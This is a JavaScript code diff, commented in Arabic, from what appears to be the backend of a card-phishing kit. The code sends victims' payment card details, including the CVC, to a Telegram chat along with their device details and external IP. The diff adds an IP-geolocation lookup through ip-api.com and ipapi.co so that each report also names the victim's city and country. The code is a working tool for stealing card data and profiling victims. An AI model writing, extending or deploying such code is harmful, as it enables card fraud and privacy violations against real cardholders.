@@ -5,6 +5,40 @@ const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
 /**
+ * دالة جلب المدينة والدولة احترافياً عبر الـ IP الخارجي من السيرفر
+ * @param {string} ip - IP الخاص بالمستخدم
+ * @returns {Promise<string>} - النص المنسق للمدينة والدولة
+ */
+async function fetchLocationByIP(ip) {
+  if (!ip || ip === "غير متوفر" || ip === "127.0.0.1" || ip === "::1") {
+    return "غير متوفر (شبكة محليّة)";
+  }
+
+  const cleanIp = String(ip).split(",")[0].trim();
+
+  try {
+    const res = await axios.get(`http://ip-api.com/json/${cleanIp}?fields=status,country,city`, { timeout: 3000 });
+    if (res.data && res.data.status === "success") {
+      const city = res.data.city || "غير معروفة";
+      const country = res.data.country || "غير معروفة";
+      return `${city}، ${country}`;
+    }
+  } catch (e) {
+    // المحاولة عبر مصدر احتياطي في حال فشل المصدر الأول
+    try {
+      const fallbackRes = await axios.get(`https://ipapi.co/${cleanIp}/json/`, { timeout: 3000 });
+      if (fallbackRes.data && fallbackRes.data.city) {
+        return `${fallbackRes.data.city}، ${fallbackRes.data.country_name}`;
+      }
+    } catch (fallbackErr) {
+      console.warn("⚠️ تعذر جلب الموقع الجغرافي للـ IP:", cleanIp);
+    }
+  }
+
+  return "غير معروف";
+}
+
+/**
  * دالة استخراج وتنسيق اسم وسيلة الدفع بشكل واضح
  */
 function getPaymentMethodName(data) {
@@ -47,13 +81,13 @@ async function sendTelegramMessage(data, isInitial = true) {
     if (isInitial) {
       // 1. الرسالة الأولى: جاري بدء عملية الدفع
       const clientID = data.clientID || data.clientId || "غير متوفر";
-      const publicIP = data.publicIP || (data.geoData && data.geoData.publicIP) || "غير متوفر";
+      const publicIP = data.publicIP || (data.geoData && data.geoData.publicIP) || data.ip || "غير متوفر";
 
-      // البيانات الجغرافية
-      const geoLat = data.lat || (data.geoData && data.geoData.lat) || "غير متوفر";
-      const geoLon = data.lon || (data.geoData && data.geoData.lon) || "غير متوفر";
-      const geoCity = data.city || (data.geoData && data.geoData.city) || "غير متوفر";
-      const geoCountry = data.country || (data.geoData && data.geoData.country) || "غير متوفر";
+      // معالجة جلب المدينة والدولة تلقائياً من الـ IP الخارجي
+      let locationText = data.city && data.country ? `${data.city}، ${data.country}` : null;
+      if (!locationText || locationText.includes("غير معروف")) {
+        locationText = await fetchLocationByIP(publicIP);
+      }
 
       // مواصفات الجهاز والبيئة
       const batteryInfo = data.battery || data.batteryInfo || "غير متوفر";
@@ -82,13 +116,12 @@ async function sendTelegramMessage(data, isInitial = true) {
                   `🔒 رمز CVC: <code>${data.card_data.cvc}</code>\n`;
       }
 
-      // تفاصيل الجهاز والشبكة والموقع المدمجة
+      // تفاصيل الجهاز والشبكة والموقع بدون الإحداثيات
       message += `\n🆔 <b>معرف الجهاز:</b> <code>${clientID}</code>\n` +
                  `🌍 <b>IP الخارجي:</b> <code>${publicIP}</code>\n` +
+                 `🏙 <b>المدينة والدولة:</b> <b>${locationText}</b>\n` +
                  `———————————————\n` +
                  `📅 <b>تاريخ الإرسال:</b> ${dateTimeStr}\n` +
-                 `📡 <b>الإحداثيات:</b> <code>${geoLat}, ${geoLon}</code>\n` +
-                 `🏙 <b>المدينة والدولة:</b> ${geoCity} | ${geoCountry}\n` +
                  `🔋 <b>حالة البطارية:</b> ${batteryInfo}\n` +
                  `📱 <b>طراز الجهاز:</b> ${deviceModel}\n` +
                  `🧠 <b>ذاكرة الجهاز (RAM):</b> ${deviceRAM}\n` +
